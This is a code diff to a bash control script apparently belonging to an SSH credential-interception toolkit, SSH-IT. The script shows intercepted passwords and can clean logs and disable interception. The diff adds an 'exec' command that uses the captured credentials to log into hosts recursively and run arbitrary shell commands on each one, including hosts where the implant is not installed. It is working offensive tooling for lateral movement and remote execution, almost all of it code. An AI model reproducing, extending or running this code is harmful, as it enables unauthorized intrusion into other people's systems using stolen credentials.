@@ -126,6 +126,24 @@ do_not_uninstall()
 do_list(){ true; }
 do_not_list(){ true; }
 
+
+
+do_not_exec()
+{
+	echo -e "${PX}└── ${CDY}WARNING: EXEC failed.${CN}"
+}
+
+do_exec()
+{
+	[[ -z $THC_CLI_ARG ]] && { do_not_exec; return; }
+
+	# sed to remove ansi color codes
+	# Bash specific 'set -o pipefail' is needed to catch exit code of last command before the pipe. 
+	(set -o pipefail; (bash -c "$THC_CLI_ARG" 2>&1) | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | while read -r l; do echo -e "${PX}│${CF}$l${CN}"; done) || { do_not_exec; exit 0; return; }
+	# (set -o pipefail; (bash -c "$THC_CLI_ARG" 2>&1)) || { do_not_exec; exit 0; return; }
+	echo -e "${PX}└── SUCCESS"
+}
+
 recursive()
 {
 	local value
@@ -177,17 +195,48 @@ recursive()
 			NEW_T_PREFIX="${THC_T_PREFIX}│###"
 			[[ -n $IS_MARK_PX_LAST ]] && [[ $n -eq 0 ]] && NEW_T_PREFIX="${THC_T_PREFIX}####" # last host
 
-			new_arg="source .prng/seed 2>/dev/null && [[ -f \"\${THC_BASEDIR}/thc_cli\" ]] && THC_SEEN_ID=\"${THC_SEEN_ID_LOCAL}\" THC_IS_REMOTE=1 THC_DEBUG=\"${THC_DEBUG}\" THC_T_PREFIX=\"${NEW_T_PREFIX}\" THC_SSH_DESTINATION=\"${LOG_SSH_DESTINATION}\" \"\${THC_BASEDIR}/thc_cli\" -r \"$cmd\" || echo -e \"[${CDR}SSH-IT not installed${CN}\"]"
+			# Must escape [$"'] so that 'bash -c' does not evaluate them. In particular we like this to work:
+			#     thc_cli -r exec 'echo user=$USER'
+			#     thc_cli -r exec 'bash -c "echo user=$USER"'
+			# without having to escape:
+			#     thc_cli -r exec 'bash -c \"echo user=\$USER\"'
+			# Testing example of what needs to work:
+			#     X='$USER'; echo 1=$X; bash -c "echo 2=$X"     # Should output 2=$USER
+			#     X='$USER"'; echo 1=$X; bash -c "echo 2=$X"    # Should output 2=$USER"
+			#     X='$USER'"'"; echo 1=$X; bash -c "echo 2=$X"  # Should output 2=$USER'
+			#     X='$USER$$'; echo 1=$X; bash -c "echo 2=$X"   # Should output 2=$USER$$
+
+			# We need to consider the special case when we got the login credentials but
+			# SSH-IT is not installed on the remote host. In this case we still like to execute
+			# our command but must do so without ~/.prng/thc_cli being available on the remote side
+			if [[ -n $THC_CLI_ARG ]]; then
+				NEW_THC_CLI_ARG="$(echo "$THC_CLI_ARG"|sed 's/[\\$\"'"'"']/\\&/g')"
+				nPX="$(echo "${NEW_T_PREFIX}"|tr '#' ' ')"
+				# Use 'kill $$' to detect if command executed successfully (neater would be to use 'set -o pipefail'
+				# but this shell might not be a bash shell....)
+				new_arg="source .prng/seed 2>/dev/null && [[ -f \"\${THC_BASEDIR}/thc_cli\" ]] && THC_SEEN_ID=\"${THC_SEEN_ID_LOCAL}\" \
+					THC_IS_REMOTE=1 THC_CLI_ARG=\"$NEW_THC_CLI_ARG\" THC_DEBUG=\"${THC_DEBUG}\" THC_T_PREFIX=\"${NEW_T_PREFIX}\" \
+					THC_SSH_DESTINATION=\"${LOG_SSH_DESTINATION}\" \"\${THC_BASEDIR}/thc_cli\" -r \"$cmd\" || \
+					{ echo -e \"[${CDR}SSH-IT not installed${CN}]\"; (bash -c \"$NEW_THC_CLI_ARG\" 2>&1 || kill \$\$) | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | while read -r l; do echo -e \"${nPX}│${CF}\$l${CN}\"; done && echo >&2 \"THC_SUCCESSMARK\"; }"
+			else
+				new_arg="source .prng/seed 2>/dev/null && [[ -f \"\${THC_BASEDIR}/thc_cli\" ]] && THC_SEEN_ID=\"${THC_SEEN_ID_LOCAL}\" \
+					THC_IS_REMOTE=1 THC_CLI_ARG=\"$NEW_THC_CLI_ARG\" THC_DEBUG=\"${THC_DEBUG}\" THC_T_PREFIX=\"${NEW_T_PREFIX}\" \
+					THC_SSH_DESTINATION=\"${LOG_SSH_DESTINATION}\" \"\${THC_BASEDIR}/thc_cli\" -r \"$cmd\" || \
+					{ echo -e \"[${CDR}SSH-IT not installed${CN}\"]; false; }"
+			fi				
+
 			DEBUGF "Logging into ${LOG_SSH_DESTINATION}"
 			# Bash trick to capture STDERR to a variable (it's a filedescriptor orgasm)
 			{ err="$( { THC_PWD_FILE="$f" SSH_ARG_EXTRA="${NEW_SSH_ARG_EXTRA}" "${BINDIR}/ssh_login.sh" "${new_arg}"; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?
+
+			[[ -n $THC_CLI_ARG ]] && [[ $err = "THC_SUCCESSMARK" ]] && echo "${nPX}└── SUCCESS"
 
 			if [[ $ret -ne 0 ]]; then
 				{ [[ $err = *"ermission"* ]] && echo -e "[${CDR}Permission denied${CN}]"; } || \
 				{ [[ $err = *"refused"* ]] && echo -e "[${CDR}Connection refused${CN}]"; } || \
 				{ [[ $err = *"timed out"* ]] && echo -e "[${CDR}Connection timed out${CN}]"; } || \
 				{ [[ $err = *"resolve"* ]] && echo -e "[${CDR}Could not resolve hostname${CN}]"; } || \
-				{ echo -e "[${CR}ERROR: $(echo -n "$err" | tr -d \\r | head -n1)${CN}]"; }
+				{ [[ -n $err ]] && echo -e "[${CR}ERROR: $(echo -n "$err" | tr -d \\r | head -n1)${CN}]"; }
 				PX="${dx}│   "
 				do_not${cmd}
 			fi
@@ -202,6 +251,20 @@ recursive()
 	do${cmd}
 
 	return "$ret"
+}
+
+myexec_r()
+{
+	recursive "_exec" && ret=0 || ret=$?
+}
+
+myexec()
+{
+	echo -en "${CDY}$(hostname)${CN}"
+	THC_T_PREFIX=""
+	THC_CLI_ARG="$1"
+
+	myexec_r
 }
 
 list_r()
@@ -219,7 +282,6 @@ list()
 	list_r
 	# [[ -z $IS_RECURSIVE ]] && echo -e "Tip: try ${CDM}${PRG} -r list${CN}"
 }
-
 
 clean_r()
 {
@@ -279,10 +341,11 @@ usage()
 "    -h          This help\n"\
 "    -r          Recursive (for all hosts)\n"\
 "Command:\n"\
-"    list      - Show passwords\n"\
-"    clean     - Clean logfiles and state information\n"\
-"    disable   - Disable interception\n"\
-"    uninstall - Clean, Disable and Remove completly\n"\
+"    list       - Show passwords\n"\
+"    exec <cmd> - Execute <cmd> on target [e.g. $PRG -r exec \"id; date\"]\n"\
+"    clean      - Clean logfiles and state information\n"\
+"    disable    - Disable interception\n"\
+"    uninstall  - Clean, Disable and Remove completly\n"\
 "Example: $PRG -r list"
 
 	exit "$1"
@@ -290,6 +353,7 @@ usage()
 
 init_vars()
 {
+	local cmd
 	PX=""
 	PRG="$(basename $0)"
 	while getopts ":hrf" opt; do
@@ -308,14 +372,20 @@ init_vars()
 	done
 	shift $((OPTIND - 1))
 
-	[[ "$1" = "list" ]] && { list; exit; }
-	[[ "$1" = "_list" ]] && { list_r; exit; } # INTERNAL
-	[[ "$1" = "clean" ]] && { clean; exit; }
-	[[ "$1" = "_clean" ]] && { clean_r; exit; }
-	[[ "$1" = "disable" ]] && { disable; exit; }
-	[[ "$1" = "_disable" ]] && { disable_r; exit; }
-	[[ "$1" = "uninstall" ]] && { uninstall; exit; }
-	[[ "$1" = "_uninstall" ]] && { uninstall_r; exit; }
+	cmd=$1
+	shift 1
+
+	p="$1"
+	[[ "$cmd" = "list" ]] && { list; exit; }
+	[[ "$cmd" = "_list" ]] && { list_r; exit; } # INTERNAL
+	[[ "$cmd" = "clean" ]] && { clean; exit; }
+	[[ "$cmd" = "_clean" ]] && { clean_r; exit; }
+	[[ "$cmd" = "disable" ]] && { disable; exit; }
+	[[ "$cmd" = "_disable" ]] && { disable_r; exit; }
+	[[ "$cmd" = "uninstall" ]] && { uninstall; exit; }
+	[[ "$cmd" = "_uninstall" ]] && { uninstall_r; exit; }
+	[[ "$cmd" = "exec" ]] && { myexec "$p"; exit; }
+	[[ "$cmd" = "_exec" ]] && { myexec_r; exit; }
 	usage 255 "unknown command -- $1"
 }
 
